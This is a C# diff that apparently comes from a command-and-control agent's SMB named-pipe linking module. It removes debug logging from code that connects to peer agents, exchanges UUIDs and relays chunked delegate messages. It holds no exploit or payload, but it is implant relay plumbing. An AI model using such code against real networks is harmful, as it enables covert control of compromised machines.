@@ -34,22 +34,17 @@ namespace Agent
         public async Task<EdgeResponseResult> Link()
         {
             //SmbLinkArgs args = JsonSerializer.Deserialize<SmbLinkArgs>(_job.task.parameters);
-            logger.Log("Inside of Link.");
             try
             {
                 if (this.clientPipe is null || !this.connected)
                 {
-                    logger.Log($"Creating new pipe to {args.hostname}.");
                     this.clientPipe = new PipeClient<SmbMessage>(args.pipename, args.hostname);
                     this.clientPipe.MessageReceived += (o, args) => OnMessageReceive(args);
                     this.clientPipe.Connected += (o, args) => this.connected = true;
                     this.clientPipe.Disconnected += (o, args) => this.connected = false;
-                    logger.Log("Connecting.");
                     await clientPipe.ConnectAsync();
-                    logger.Log("Done Connecting.");
                     if (clientPipe.IsConnected)
                     {
-                        logger.Log($"Established link with agent.");
                         this.connected = true;
 
                         //Wait for the agent to give us its UUID
@@ -78,7 +73,6 @@ namespace Agent
             }
             catch (Exception e)
             {
-                logger.Log($"Error in link: {e}");
                 return new EdgeResponseResult()
                 {
                     task_id = task_id,
@@ -116,7 +110,6 @@ namespace Agent
         }
         private async Task OnMessageReceive(ConnectionMessageEventArgs<SmbMessage> args)
         {
-            logger.Log($"Message received from pipe {args.Message.delegate_message.Length} bytes");
             try
             {
                 switch (args.Message.message_type)
@@ -189,7 +182,6 @@ namespace Agent
 
                 IEnumerable<string> parts = dm.message.SplitByLength(4000);
 
-                logger.Log($"Sending message with size of {dm.message.Length} in {parts.Count()} chunks.");
                 foreach (string part in parts)
                 {
                     sm.delegate_message = part;
@@ -198,7 +190,6 @@ namespace Agent
                     {
                         sm.final = true;
                     }
-                    logger.Log($"Sending message to pipe: {part.Length} bytes. (Final = {sm.final})");
 
                     await this.clientPipe.WriteAsync(sm);
 
@@ -208,7 +199,6 @@ namespace Agent
             }
             catch (Exception e)
             {
-                logger.Log($"Error in send: {e}");
                 return false;
             }
         }
